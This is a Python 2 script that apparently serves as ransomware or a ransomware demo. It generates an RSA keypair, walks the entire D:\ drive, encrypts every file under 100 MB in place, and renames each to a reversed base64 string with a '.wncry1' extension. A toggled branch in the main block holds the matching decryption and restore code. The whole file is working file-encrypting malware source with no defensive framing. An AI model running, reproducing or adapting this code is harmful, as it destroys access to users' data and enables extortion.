# coding=UTF-8
from Crypto import Random
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
import os
from os.path import join, getsize
import sys
import base64

reload(sys)
sys.setdefaultencoding('utf8')
root3 = 'master-private.pem'
root2 = 'master-public.pem'
def RSA_Gener():
    random_generator = Random.new().read
    rsa = RSA.generate(2048, random_generator)
    private_pem = rsa.exportKey()
    with open(root3, 'w') as f:
        f.write(private_pem)
        pri=private_pem
    public_pem = rsa.publickey().exportKey()
    with open(root2, 'w') as f:
        f.write(public_pem)
        pub=public_pem
    d = 'D:\\'
    main(d)
def encrypt(message):
    with open(root2, 'r') as f:
        pub = f.read()
    ret = ''
    input_text = message[:128]
    while input_text:
        key = RSA.importKey(pub)
        cipher = PKCS1_v1_5.new(key)
        try:
            ret += cipher.encrypt(input_text)
        except Exception as e:
            print e
        try:
            message = message[128:]
            input_text = message[:128]
        except Exception as e:
            print e
    return ret
def decrypt(ciphertext):
    with open(root3, 'r') as f:
        pri = f.read()
    key = RSA.importKey(pri)
    input_text = ciphertext[:256]
    ret = ''
    while input_text:
        sentinel = Random.new().read
        cipher = PKCS1_v1_5.new(key)
        try:
            _message = cipher.decrypt(input_text, sentinel)
            # ret += _message[:-dsize]
            ret += _message
        except Exception as e:
            print e
        ciphertext = ciphertext[256:]
        input_text = ciphertext[:256]
    return ret
def main(rootDir):
    list_dirs = os.walk(rootDir,topdown=True)
    for root, dirs, files in list_dirs:
        for f in files:
            filename = os.path.join(root, f)
            print filename
            size=getsize(filename)/1024/1024
            if size<100:
                try:
                    with open(filename,'rb') as f1:
                        message=f1.read()
                        message=encrypt(message)
                except Exception as e:
                    print e
                try:
                    with open(filename,'wb') as f2:
                        f2.write(message)
                except Exception as e:
                    print e
                RenameFile(root, f)

def RenameFile(dir,filename):
    filename_bytes = filename
    #print filename
    filename_bytes_base64 = base64.encodestring(filename_bytes)
    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # 倒序
    new_filename = filename_bytes_base64 + '.wncry1'
    # print (new_filename)
    #print(os.path.join(dir, filename))
    print(os.path.join(dir, new_filename))
    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))


def ReserveFilename(dir, filename):
    f = filename
    filename = filename[::-1][7:][::-1]
    filename_base64 = filename[::-1] + '\n'
    filename_bytes_base64 = filename_base64
    ori_filename = base64.decodestring(filename_bytes_base64)
    #print(os.path.join(dir, f))
    print(os.path.join(dir,ori_filename))
    try:
        os.rename(os.path.join(dir, f),os.path.join(dir,ori_filename))
    except WindowsError as e:
        print e
if __name__ == '__main__':
    i=0
    if i==0:
        RSA_Gener()

    else:
        rootDir = 'D:\\'
        list_dirs = os.walk(rootDir, topdown=True)
        for root, dirs, files in list_dirs:
            for f in files:
                filename = os.path.join(root, f)
                print filename
                size = getsize(filename) / 1024 / 1024
                if size < 100:
                    try:
                        with open(filename, 'rb') as f1:
                            message = f1.read()
                            message = decrypt(message)
                    except Exception as e:
                        print e
                    try:
                        with open(filename, 'wb') as f2:
                            f2.write(message)
                    except Exception as e:
                        print e
                    ReserveFilename(root, f)
    raw_input("Press Enter to terminate.")
